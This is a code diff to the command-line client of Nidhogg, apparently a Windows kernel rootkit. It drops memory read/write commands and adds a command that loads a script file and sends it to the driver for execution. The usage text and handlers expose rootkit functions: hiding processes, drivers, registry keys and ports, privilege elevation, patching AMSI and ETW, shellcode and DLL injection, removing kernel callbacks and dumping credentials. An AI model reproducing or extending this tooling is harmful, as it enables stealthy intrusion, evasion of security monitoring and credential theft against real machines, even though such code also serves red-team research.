@@ -6,8 +6,8 @@
 
 enum class Options {
 	Unknown,
-	Add, Remove, Clear, Hide, Unhide, Elevate, Signature, Query, Write, Read, Patch, InjectShellcode, InjectDll,
-	DumpCredentials
+	Add, Remove, Clear, Hide, Unhide, Elevate, Signature, Query, Patch, InjectShellcode, InjectDll, DumpCredentials,
+	ExecuteScript
 };
 
 #define PRINT_ASCII_ART
@@ -44,18 +44,19 @@ constexpr const char* ASCII_ART = "";
 void PrintUsage() {
 	std::cout << "[ * ] Possible usage:" << std::endl;
 	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | unhide | elevate | signature | query ] [pid] [signer type] [signature signer]" << std::endl;
-	std::cout << "\tNidhoggClient.exe thread [add | remove | clear | hide | query ] [tid]" << std::endl;
-	std::cout << "\tNidhoggClient.exe module [hide | unhide] [pid] [module path]" << std::endl;
+	std::cout << "\tNidhoggClient.exe thread [add | remove | clear | hide | unhide | query ] [tid]" << std::endl;
+	std::cout << "\tNidhoggClient.exe module [hide] [pid] [module path]" << std::endl;
 	std::cout << "\tNidhoggClient.exe driver [hide | unhide] [driver path]" << std::endl;
 	std::cout << "\tNidhoggClient.exe file [add | remove | clear | query] [path]" << std::endl;
 	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide | unhide | query] [key] [value]" << std::endl;
-	std::cout << "\tNidhoggClient.exe patch [pid] [amsi | etw | module name] [function] [patch comma seperated]" << std::endl;
+	std::cout << "\tNidhoggClient.exe patch [pid] [amsi | etw | module name] [function] [patch comma separated]" << std::endl;
 	std::cout << "\tNidhoggClient.exe shinject [apc | thread] [pid] [shellcode file] [parameter 1] [parameter 2] [parameter 3]" << std::endl;
 	std::cout << "\tNidhoggClient.exe dllinject [apc | thread] [pid] [dll path]" << std::endl;
 	std::cout << "\tNidhoggClient.exe callbacks [query | remove | restore] [callback type] [callback address]" << std::endl;
 	std::cout << "\tNidhoggClient.exe etwti [enable | disable]" << std::endl;
 	std::cout << "\tNidhoggClient.exe dump_creds" << std::endl;
 	std::cout << "\tNidhoggClient.exe port [hide | unhide | query | clear] [port number] [tcp/udp] [remote/local]" << std::endl;
+	std::cout << "\tNidhoggClient.exe exec_script [script_file]" << std::endl;
 }
 
 std::vector<byte> ConvertToVector(std::wstring rawPatch) {
@@ -130,14 +131,12 @@ int wmain(int argc, const wchar_t* argv[]) {
 		option = Options::Query;
 	else if (_wcsicmp(argv[1], L"patch") == 0)
 		option = Options::Patch;
-	else if (_wcsicmp(argv[1], L"write") == 0)
-		option = Options::Write;
-	else if (_wcsicmp(argv[1], L"read") == 0)
-		option = Options::Read;
 	else if (_wcsicmp(argv[1], L"shinject") == 0)
 		option = Options::InjectShellcode;
 	else if (_wcsicmp(argv[1], L"dllinject") == 0)
 		option = Options::InjectDll;
+	else if (_wcsicmp(argv[1], L"exec_script") == 0)
+		option = Options::ExecuteScript;
 	else {
 		std::cerr << "[ - ] Unknown option." << std::endl;
 		nidhoggInterface.PrintError(NIDHOGG_INVALID_INPUT);
@@ -712,52 +711,6 @@ int wmain(int argc, const wchar_t* argv[]) {
 		break;
 	}
 
-	case Options::Write:
-	case Options::Read:
-	{
-		MODE mode;
-
-		if (argc != 6) {
-			success = NIDHOGG_INVALID_OPTION;
-			break;
-		}
-
-		if (_wcsicmp(argv[5], L"kernel") == 0)
-			mode = MODE::KernelMode;
-		else if (_wcsicmp(argv[5], L"user") == 0)
-			mode = MODE::UserMode;
-		else {
-			std::cerr << "[ - ] Invalid mode." << std::endl;
-			success = NIDHOGG_INVALID_OPTION;
-			break;
-		}
-
-		int pid = _wtoi(argv[2]);
-
-		if (pid == 0) {
-			std::cerr << "[ - ] Invalid PID." << std::endl;
-			success = NIDHOGG_INVALID_OPTION;
-			break;
-		}
-
-		int size = _wtoi(argv[4]);
-
-		if (size == 0) {
-			std::cerr << "[ - ] Invalid size." << std::endl;
-			success = NIDHOGG_INVALID_OPTION;
-			break;
-		}
-
-		int remoteAddress = ConvertToInt(argv[3]);
-
-		if (remoteAddress == 0) {
-			std::cerr << "[ - ] Invalid address." << std::endl;
-			success = NIDHOGG_INVALID_OPTION;
-			break;
-		}
-		break;
-	}
-
 	case Options::InjectShellcode:
 	{
 		InjectionType injectionType;
@@ -838,6 +791,7 @@ int wmain(int argc, const wchar_t* argv[]) {
 		success = nidhoggInterface.InjectDll(pid, dllPath.c_str(), injectionType);
 		break;
 	}
+
 	case Options::DumpCredentials:
 	{
 		DesKeyInformation desKey{};
@@ -868,6 +822,25 @@ int wmain(int argc, const wchar_t* argv[]) {
 			}
 			std::cout << std::endl;
 		}
+		break;
+	}
+
+	case Options::ExecuteScript:
+	{
+		if (argc != 3) {
+			success = NIDHOGG_INVALID_OPTION;
+			break;
+		}
+		std::ifstream input(argv[2], std::ios::binary);
+
+		if (input.bad()) {
+			std::cerr << "[ - ] Invalid script file." << std::endl;
+			success = NIDHOGG_INVALID_OPTION;
+			break;
+		}
+		std::vector<unsigned char> script(std::istreambuf_iterator<char>(input), {});
+
+		success = nidhoggInterface.ExecuteScript(script.data(), (DWORD)script.size());
 		break;
 	}
 	}
